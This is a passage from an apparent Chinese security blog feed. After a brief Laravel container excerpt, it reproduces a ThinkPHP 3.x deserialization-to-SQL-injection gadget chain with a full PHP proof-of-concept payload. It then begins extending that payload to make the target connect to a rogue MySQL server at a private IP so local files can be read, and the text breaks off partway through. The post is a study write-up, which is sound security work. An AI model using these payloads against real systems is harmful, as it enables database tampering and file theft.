class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过 Container 注册一个 binding</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string  $abstract</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  \Closure|string|null  $concrete</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  bool  $shared</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params"><span class="variable">$abstract</span>, <span class="variable">$concrete</span> = <span class="literal">null</span>, <span class="variable">$shared</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//如果传进来的实例不是一个匿名函数</span></span><br><span class="line">    <span class="comment">//将会通过 $this-&gt;getClosure</span></span><br><span class="line">    <span class="comment">//强行给实例添加一个匿名函数</span></span><br><span class="line">    <span class="comment">//不过由于添加匿名函数时，$this 是 Container 类</span></span><br><span class="line">    <span class="comment">//所以需要给 getClosure() 传入 $concrete。确保原来的类实例存在</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$concrete</span> <span class="keyword">instanceof</span> <span class="built_in">Closure</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (! is_string(<span class="variable">$concrete</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">TypeError</span>(<span class="built_in">self</span>::class.<span class="string">&#x27;::bind(): Argument #2 ($concrete) must be of type Closure|string|null&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//!!!!</span></span><br><span class="line">        <span class="variable">$concrete</span> = <span class="keyword">$this</span>-&gt;getClosure(<span class="variable">$abstract</span>, <span class="variable">$concrete</span>);</span><br><span class="line">        <span class="comment">//!!!!</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//注册实例</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>] = compact(<span class="string">&#x27;concrete&#x27;</span>, <span class="string">&#x27;shared&#x27;</span>);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><p>调用已注册的 <em>binding</em>  使用的是 <em>Container</em>类 的 <em>build()</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">build</span>(<span class="params"><span class="variable">$concrete</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//如果传入的实例是匿名函数</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$concrete</span> <span class="keyword">instanceof</span> <span class="built_in">Closure</span>) &#123;</span><br><span class="line">        <span class="comment">//直接使用 变量() 的方式进行调用</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$concrete</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;getLastParameterOverride());</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;br&gt;

&lt;p&gt;在翻看 Laravel 源码时，发现其进行服务注册的时候，大量使用了诸如这样的格式:&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="http://example.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>tp3.x sql注入复现</title>
    <link href="http://example.com/2021/03/01/2021-02-28-tp3-x-sql/"/>
    <id>http://example.com/2021/03/01/2021-02-28-tp3-x-sql/</id>
    <published>2021-03-01T15:41:00.000Z</published>
    <updated>2021-04-23T05:57:20.805Z</updated>
    
    <content type="html"><![CDATA[<p>Reference：</p><p><a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p><span id="more"></span><br><h2 id="反序列化起点"><a href="#反序列化起点" class="headerlink" title="反序列化起点"></a>反序列化起点</h2><p><strong>ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</strong></p><p>line 636 - line 642</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;img) || <span class="keyword">$this</span>-&gt;img-&gt;destroy();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>在反序列化中，所有成员属性均可控。即 <code>$this-&gt;img</code> 可控。</p><p>如此一来，即可 <strong>无参数式</strong> 调用 TP 下任意类的 <em>destroy</em> 方法</p><br><h2 id="destroy-跳板"><a href="#destroy-跳板" class="headerlink" title="destroy()  跳板"></a>destroy()  跳板</h2><p>搜索 destroy 方法，找到三个存在 destroy 的位置：</p><img src="/2021/03/01/2021-02-28-tp3-x-sql/1.png" style="width:500px;"><p>其中两个类 <code>Think\Session\Driver\Mysqli</code>类 和 <code>Think\Session\Driver\Db</code>类  是直接调用 <em>mysqli_query</em> 进行数据库操作的，如下：</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"><span class="variable">$sessID</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$hander</span> = is_array(<span class="keyword">$this</span>-&gt;hander) ? <span class="keyword">$this</span>-&gt;hander[<span class="number">0</span>] : <span class="keyword">$this</span>-&gt;hander;</span><br><span class="line">    mysqli_query(<span class="variable">$hander</span>, <span class="string">&quot;DELETE FROM &quot;</span> . <span class="keyword">$this</span>-&gt;sessionTable . <span class="string">&quot; WHERE session_id = &#x27;<span class="subst">$sessID</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mysqli_affected_rows(<span class="variable">$hander</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>由于 <em>mysqli_query</em> 中 <code>$hander</code> 的值取决与 <code>$this-&gt;hander</code>，但是就算我们在序列化 POC 中进行 <em>mysqli_connect</em> ，句柄移植之后是不可用的，所以这个点只能放弃。</p><br><p>这里注意下， php7 调用有参数函数时必须传参，不然会报错。但 php5 则可不传参数调用有参数函数。</p><br><p>转头看第三个类 <code>Think\Session\Driver\Memcache</code> </p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"><span class="variable">$sessID</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handle-&gt;delete(<span class="keyword">$this</span>-&gt;sessionName . <span class="variable">$sessID</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>由于 <code>$this-&gt;handle</code> 可控，我们可以调用任意类的 <em>delete</em> 方法。</p><p>并且由于跳到 <em>destroy</em> 方法时是 <strong>无参数调用</strong>。这里的 <em>$sessID</em> 是个无效的形参。用这个无效的形参去调用别的函数时，传入的参数会无效。所以这里调用 <em>delete</em> 的形参还是不可控的</p><br><h2 id="Model-delete-跳板"><a href="#Model-delete-跳板" class="headerlink" title="Model delete() 跳板"></a>Model delete() 跳板</h2><p>全局搜索 <code>function delete</code>。找到 <code>Think\Model</code> 类</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pk</span> = <span class="keyword">$this</span>-&gt;getPk();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$options</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// 如果删除条件为空 则删除当前数据对象所对应的记录</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$pk</span>])) &#123;</span><br><span class="line">            <span class="comment">//!</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;delete(<span class="keyword">$this</span>-&gt;data[<span class="variable">$pk</span>]);</span><br><span class="line">            <span class="comment">//!</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="comment">// 分析表达式</span></span><br><span class="line">    <span class="variable">$options</span> = <span class="keyword">$this</span>-&gt;_parseOptions();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">......    </span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;db-&gt;delete(<span class="variable">$options</span>);</span><br><span class="line"> ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><code>$this-&gt;getPK()</code>函数仅仅只是 <code>return $this-&gt;pk;</code></p><p>所以 <em>$pk</em> 的值为 <em>$this-&gt;pk</em></p><br><p>可以发现在 <code>if</code> 判断中，如果传入的 <em>$options</em> 为空，则重新调用 <code>$this-&gt;delete()</code> 方法 ，并且传入的参数为 <code>$this-&gt;data[$pk]</code>。这样子 *delete()*方法的形参 <em>$options</em> 就是可控的了。</p><br><p>在<em>分析表达式</em> 流程中，重新为 <em>$options</em> 赋值，调用了 <code>$this-&gt;_parseOptions()</code>。该方法将会返回 <code>$this-&gt;options</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$options</span>)) &#123;</span><br><span class="line">        <span class="variable">$options</span> = array_merge(<span class="keyword">$this</span>-&gt;options, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$options</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><em>分析表达式</em> 流程后还判断了 <em>$options[‘where’]</em> 。需要确保 <em>$options</em> 中有该值</p><br><p>程序接着调用了 <code>$this-&gt;db-&gt;delete($options)</code>，其中 <em>$this-&gt;db</em> 可控，并且 <em>$options</em> 可控，全局搜索 <code>function delete</code>。找到 <em>Think\Db\Driver</em> 类。</p><p>至于选择这个类的原因，因为它在后面构造 <em>SQL payload</em> 的时候比较方便。</p><h2 id="Driver-delete-跳板"><a href="#Driver-delete-跳板" class="headerlink" title="Driver delete() 跳板"></a>Driver delete() 跳板</h2><br><p><em>Think\Db\Driver</em> 类 <em>delete()</em> 方法主要代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$table</span> = <span class="keyword">$this</span>-&gt;parseTable(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>   = <span class="string">&#x27;DELETE FROM &#x27;</span> . <span class="variable">$table</span>;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute(<span class="variable">$sql</span>, !<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><br><p>可是该类为抽象类，无法直接实例化。需要找一个继承它的子类，并且该类没有 *delete()*，这样程序调用的时候才能调用到父类的 <em>delete()</em> 方法。</p><p>最终找到 <em>Think\Db\Driver\Mysql</em>类 作为反序列化的实例化类。</p><br><p><code>delete()</code>方法 最终调用了 <code>$this-&gt;execute()</code>，由于此类是专门用作数据库操作的，<code>execute()</code> 中并没有发现能 RCE 的点，也没有发现能当跳板的点。</p><p>不过注意到 <code>execute()</code> 的第一行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;initConnect(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><br><p>跟进，发现当不存在 <em>$this-&gt;_linkID</em> 时，将会调用 <em>$this-&gt;connect()</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_linkID) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_linkID = <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>跟进，发现该函数使用 <em>PDO</em> 进行数据库连接，并返回了句柄</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$config</span>)) &#123;</span><br><span class="line">        <span class="variable">$config</span> = <span class="keyword">$this</span>-&gt;config;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>] = <span class="keyword">new</span> PDO(<span class="variable">$config</span>[<span class="string">&#x27;dsn&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>], <span class="keyword">$this</span>-&gt;options);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>];</span><br></pre></td></tr></table></figure><br><p>返回句柄后，<code>execute</code>方法 将会根据 <strong>传入的 sql语句</strong> 执行sql。这里 <strong>传入的sql语句</strong> 就是 <code>delete()</code>方法 中的 <code>$sql</code></p><br><h2 id="基本Payload"><a href="#基本Payload" class="headerlink" title="基本Payload"></a>基本Payload</h2><p>至此，以上整个从反序列化到执行SQL注入的流程。根据以上流程，得出基本Payload:</p><p><strong>Payload demo:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第三个跳板，也可以说是最终执行类</span></span><br><span class="line"><span class="comment">//由于执行类 Db 是抽象类，无法实例化</span></span><br><span class="line"><span class="comment">//遂使用其子类 Mysql进行实例化</span></span><br><span class="line"><span class="comment">//由于 payload 需要调用父类的 delete()</span></span><br><span class="line"><span class="comment">//子类必须没有 delete() 方法</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Mysql</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第二个跳板 <span class="title">Model</span>-&gt;<span class="title">delete</span>()</span><br><span class="line"><span class="title">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">protected $pk = &#x27;exp&#x27;;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> \Think\Db\Driver\Mysql();</span><br><span class="line"><span class="comment">//$this-&gt;pk 的值需要和 $this-&gt;data 其中一个 key值 一致</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="comment">//$this-&gt;data 内容随意，只是过一个 if</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;data = [</span><br><span class="line"><span class="string">&#x27;x&#x27;</span> =&gt; [</span><br><span class="line"><span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">111</span>,</span><br><span class="line">]</span><br><span class="line">];</span><br><span class="line"><span class="keyword">$this</span>-&gt;options = [</span><br><span class="line"><span class="comment">//内容随意，也只是过一个 if</span></span><br><span class="line"><span class="string">&#x27;where&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line"><span class="comment">//$sql   = &#x27;DELETE FROM &#x27; . $table;</span></span><br><span class="line"><span class="comment">//SQL 注入语句</span></span><br><span class="line">                <span class="comment">//!!!注意!!!</span></span><br><span class="line">                <span class="comment">//DELETE 是高风险操作，小心谨慎</span></span><br><span class="line"><span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;mysql.user where 1=2 #&#x27;</span></span><br><span class="line">];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(1) 第一个跳板 Memcache-&gt;destroy()</span></span><br><span class="line"><span class="comment">//(2) 在这个方法中又调用了 $this-&gt;handle-&gt;delete($this-&gt;sessionName . $sessID);</span></span><br><span class="line"><span class="comment">//(3) sessionName 必须为空，如果为字符串传入的话，由于 $sessID 没有赋值</span></span><br><span class="line"><span class="comment">//最终调用 $this-&gt;handle-&gt;delete()时将会传入非预期值</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Memcache</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">handle</span> = <span class="title">null</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$sessionName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> \Think\Model();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//梦开始的地方</span></span><br><span class="line"><span class="comment">//调用地一个跳板 Memcache-&gt;destroy()</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Imagick</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">img</span> = <span class="title">null</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> \Think\Session\Driver\Memcache();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">a</span> = <span class="title">new</span> \<span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>开启 Debug ，追踪程序执行流程，发现 SQL 语句成功被控制</p><img src="/2021/03/01/2021-02-28-tp3-x-sql/2.png" style="width:500px;"><br><p>但是，由于我们无法知道目标服务器的 Mysql 配置，所以 SQL注入自然是跑不动的。</p><p>仔细查看数据库连接函数 <code>connect</code> 后，发现其 PDO 配置是我们可控的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$config</span>)) &#123;</span><br><span class="line">        <span class="variable">$config</span> = <span class="keyword">$this</span>-&gt;config;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>] = <span class="keyword">new</span> PDO(<span class="variable">$config</span>[<span class="string">&#x27;dsn&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>], <span class="keyword">$this</span>-&gt;options);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>];</span><br></pre></td></tr></table></figure><br><p>所以我们可以控制 tp3 连接的数据库，自然想到了 Rogue mysql server</p><p><strong>原理简单来说是这样的：</strong></p><p>mysql中有一个 SQL语句，为 LOAD DATA LOCAL INFILE。作用是将客户端本地的文件加载到数据库中。而 Rogue mysql server 可以任意读取 mysql 客户端的本地文件。</p><p>具体详情可见本博客的另一篇文章 :)</p><a href="/2021/02/08/2021-02-08-mysql-load-data/" title="Rogue Mysql Server 简单分析">Rogue Mysql Server 简单分析</a><br><p>尝试让 tp3 连接 Rogue  mysql server。修改 payload，增加数据库配置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Mysql</span>&#123;</span><br><span class="line">        //新增 <span class="title">mysql</span> 配置</span><br><span class="line"><span class="title">protected</span> $<span class="title">config</span> = <span class="title">array</span>(</span><br><span class="line">        &#x27;type&#x27;           =&gt; &#x27;mysql&#x27;, // 数据库类型</span><br><span class="line">        <span class="string">&#x27;hostname&#x27;</span>       =&gt; <span class="string">&#x27;192.168.92.164&#x27;</span>, <span class="comment">// 服务器地址</span></span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>       =&gt; <span class="string">&#x27;root&#x27;</span>, <span class="comment">// 用户名</span></span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>       =&gt; <span class="string">&#x27;123456&#x27;</span>, <span class="comment">// 密码</span></span><br><span class="line">        <span class="string">&#x27;hostport&#x27;</span>       =&gt; <span class="string">&#x27;3333&#x27;</span>, <span class="comment">// 端口</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//设置这个 PDO 才能 LOAD DATA 